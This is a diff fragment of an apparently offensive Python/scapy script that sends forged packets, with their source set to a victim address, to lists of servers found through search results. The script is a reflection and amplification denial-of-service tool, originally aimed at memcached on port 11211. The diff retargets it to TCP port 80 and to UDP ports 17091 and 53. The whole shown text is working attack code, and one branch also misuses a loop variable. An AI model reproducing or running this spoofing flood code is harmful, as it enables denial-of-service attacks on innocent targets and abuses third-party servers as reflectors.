@@ -96,14 +96,14 @@ while True:
                     for i in ip_array:
                         print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                         with suppress_stdout():
-                            send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=power)
-                            send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
+                            send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=80)/Raw(load=setdata))
+                            send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=17091)/Raw(load=getdata))
                 else:
                     for result in results['matches']:
                         print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
                         with suppress_stdout():
                             send(IP(src=target, dst='%s' % result['ip_str']) / TCP(sport=int(str(targetport)),dport=80)/Raw(load=setdata), count=power)
-                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=80)/Raw(load=getdata), count=power)
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=53)/Raw(load=getdata), count=power)
                 print('')
                 print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                 break
